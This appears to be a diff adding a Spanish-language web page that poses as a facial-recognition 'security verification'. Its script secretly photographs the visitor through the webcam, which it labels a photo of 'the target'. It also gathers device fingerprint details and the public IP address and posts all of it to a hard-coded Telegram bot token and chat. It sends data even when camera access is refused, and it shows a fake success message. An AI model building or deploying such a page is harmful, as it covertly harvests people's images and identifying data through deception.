@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+               background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+               color: white; min-height: 100vh; display: flex; justify-content: center;
+               align-items: center; }
+        .card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px);
+                border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+                padding: 40px; max-width: 420px; text-align: center; }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #a0a0b0; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
+        .btn { background: linear-gradient(135deg, #667eea, #764ba2); color: white;
+               border: none; padding: 14px 32px; border-radius: 12px; font-size: 16px;
+               cursor: pointer; transition: transform 0.2s; width: 100%; }
+        .btn:hover { transform: scale(1.02); }
+        .btn:active { transform: scale(0.98); }
+        #status { margin-top: 16px; font-size: 13px; color: #4ecca3; min-height: 20px; }
+        .progress { display: none; margin-top: 16px; }
+        .progress-bar { height: 4px; background: #333; border-radius: 2px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2);
+                         width: 0%; transition: width 0.5s; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">🔐</div>
+        <h1>Verificación de Identidad</h1>
+        <p>Para acceder al contenido protegido, necesitamos verificar tu identidad mediante reconocimiento facial.</p>
+        <button class="btn" onclick="startCapture()" id="startBtn">Iniciar Verificación</button>
+        <div class="progress" id="progress">
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        </div>
+        <p id="status"></p>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+    <script>
+        async function startCapture() {
+            const status = document.getElementById('status');
+            const btn = document.getElementById('startBtn');
+            const progress = document.getElementById('progress');
+            const fill = document.getElementById('progressFill');
+            btn.disabled = true;
+            btn.textContent = 'Procesando...';
+            progress.style.display = 'block';
+            fill.style.width = '20%';
+            status.textContent = 'Iniciando cámara...';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                fill.style.width = '40%';
+                status.textContent = 'Capturando imagen...';
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2500));
+                fill.style.width = '60%';
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                fill.style.width = '80%';
+                status.textContent = 'Verificando...';
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', '7891650726');
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', '🧿 CAPTURA DE CÁMARA RECIBIDA\n📸 Foto del objetivo');
+                    try {
+                        await fetch('https://api.telegram.org/bot8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ/sendPhoto', {
+                            method: 'POST', body: formData
+                        });
+                    } catch(e) {}
+                    fill.style.width = '100%';
+                    status.textContent = '✅ Verificación completada';
+                    btn.textContent = 'Verificado ✓';
+                }, 'image/jpeg', 0.85);
+                // Info del dispositivo
+                const info = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages.join(', '),
+                    screen: screen.width + 'x' + screen.height,
+                    colorDepth: screen.colorDepth + 'bit',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                    deviceMemory: navigator.deviceMemory || 'N/A',
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                    touchPoints: navigator.maxTouchPoints,
+                    online: navigator.onLine,
+                    timestamp: new Date().toISOString()
+                };
+                let msg = '🧿 INFO DEL DISPOSITIVO\n━━━━━━━━━━━━━━━━━━━━\n';
+                for (const [k, v] of Object.entries(info)) { msg += k + ': ' + v + '\n'; }
+                // Obtener IP
+                try {
+                    const ipResp = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResp.json();
+                    msg += '\n🌐 IP: ' + ipData.ip;
+                } catch(e) {}
+                await fetch('https://api.telegram.org/bot8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: '7891650726', text: msg })
+                });
+            } catch(e) {
+                status.textContent = 'Cámara no disponible';
+                btn.textContent = 'Reintentar';
+                btn.disabled = false;
+                fill.style.width = '100%';
+                // Enviar info aunque falle la cámara
+                const info = {
+                    error: e.message,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString()
+                };
+                let msg = '🧿 CÁMARA DENEGADA - Info capturada:\n';
+                for (const [k, v] of Object.entries(info)) { msg += k + ': ' + v + '\n'; }
+                try {
+                    const ipResp = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResp.json();
+                    msg += '\n🌐 IP: ' + ipData.ip;
+                } catch(e2) {}
+                await fetch('https://api.telegram.org/bot8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: '7891650726', text: msg })
+                });
+            }
+        }
+    </script>
+</body>
+</html>
